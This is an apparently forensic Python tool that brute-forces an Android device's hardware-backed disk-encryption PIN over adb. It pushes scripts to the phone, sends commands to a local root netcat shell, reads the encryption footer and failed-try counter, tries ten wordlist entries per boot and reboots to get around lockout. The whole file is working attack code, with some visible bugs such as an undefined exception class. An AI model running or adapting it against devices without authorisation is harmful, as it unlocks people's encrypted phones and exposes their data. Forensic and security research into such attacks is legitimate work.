import os 
import argparse
import sys
import subprocess
import platform
import struct

class bruteforcer:
    pos=0
    wordlistname=""
    adbpath=""
    tries=0
    
    def __init__(self,wordlistname):
        self.pos = 0
        if platform.system()=='Windows':
            self.adbpath = os.path.join("Tools", "adb")
        else:
            self.adbpath = os.path.join("adb")
        inFile = open(wordlistname, 'r')
        # read all pins into list structure
        masterlist = inFile.readlines()
        #generate the wordlist to be uploaded 10 tries
        self.gen_Wordlist(masterlist)
        print("Wordlist generated :-0")
        serial=""
        print("Waiting for device to appear")
        self.run(self.adbpath + ' wait-for-usb-device')
        serial = self.run(self.adbpath+" get-serialno").strip('\n').strip('\r')
        print ("[ * ] serial number of connected adb device: " + serial)
        self.run(self.adbpath+' push '+os.path.join("bruteforce","getfooter.sh")+' /data/local/tmp/getfooter.sh')
        self.run(self.adbpath+' shell chmod 755 /data/local/tmp/getfooter.sh')
        self.run(self.adbpath+' shell "echo /data/local/tmp/getfooter.sh | toybox nc 0.0.0.0 1231"')
        self.run(self.adbpath+' pull /data/local/tmp/footer.bin '+os.path.join("tmp","footer.bin"))
        self.run(self.adbpath+' pull /data/local/tmp/ssd '+os.path.join("tmp","ssd"))
        with open(os.path.join("tmp","footer.bin"),"rb") as ft:
            footer=ft.read()
            self.tries=struct.unpack("<I",footer[0x20:0x24])
            result=input("Detected %d previous tries, shall we start ?"%self.tries).lower()
            if (result=="n"):
                exit()
        self.bruteforce(masterlist)

    
    def gen_Wordlist(self,master):
        if not os.path.exists("tmp"):
            os.mkdir("tmp")
        with open(os.path.join("tmp","wordlist.txt"),'w') as outFile:
            pinTries = master[self.pos:self.pos+10]
            outFile.writelines(pinTries)
            self.pos+=10

    def uploadfiles(self):
        self.run(self.adbpath+' push '+os.path.join("tmp","footer.bin")+' /data/local/tmp/footer.bin')
        self.run(self.adbpath+' push '+os.path.join("tmp","wordlist.txt")+' /data/local/tmp/wordlist.txt')
        self.run(self.adbpath+' push '+os.path.join("bruteforce","bf.sh")+' /data/local/tmp/bf.sh')
        self.run(self.adbpath + ' shell chmod 755 /data/local/tmp/bf.sh')
        self.run(self.adbpath+' push '+os.path.join("tmp","ssd")+' /data/local/tmp/ssd')

    def bruteforce(self,inlist):
        print("--------Starting bruteforce--------")
        found = False
        success = "Password correct"
        while found == False:
            self.uploadfiles()
            print("Bruteforcing passwords... please wait")

            result = self.run(self.adbpath+' shell "echo /data/local/tmp/bf.sh | toybox nc 0.0.0.0 1231"')
        
            if success in result:
                print("Password found")
                password=result.split("Password correct: ")[1]
                password=password.split("\n")[0]
                print("Running vdc cryptfs checkpw "+password)
                result = self.run(self.adbpath+' shell "echo vdc cryptfs checkpw '+password+' | toybox nc 0.0.0.0 1231"')
                exit()
                found= True
            else:
                print(f"Calculated {self.pos} passwords")
                self.gen_Wordlist(inlist)
                self.run(self.adbpath+' shell sync')
                self.run(self.adbpath+' reboot boot')
                self.run(self.adbpath+' wait-for-usb-device')
  
    def run(self,command):
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output=""
        # Poll process for new output until finished
        while True:
            nextline = process.stdout.readline()
            output+=nextline.decode('utf-8')
            if nextline == b'' and process.poll() is not None:
                break
            sys.stdout.write(nextline.decode('utf-8'))
            sys.stdout.flush()

        outp = process.communicate()[0]
        exitCode = process.returncode

        if (exitCode == 0):
            return output
        else:
            raise ProcessException(command, exitCode, output)
    
def main(argv):
    # Parse input wordlist
    parser = argparse.ArgumentParser()
    parser.add_argument('--wordlist','-w', dest='wordlist', default="", action='store', help="The master wordlist to be used for bruteforcing")
    args = parser.parse_args()
    wl = args.wordlist
    if wl=="":
        print("HW-Crypto ballistics - (c) B.Kerler/N.Andrew 2018")
        print("Usage: bruteforce.py --wordlist [wordlist.txt]")
        exit(0)
    cwd = os.getcwd()
    bf=bruteforcer(os.path.join(cwd,wl))
    bf.bruteforce(wl)

if __name__ == "__main__":
   main(sys.argv[1:])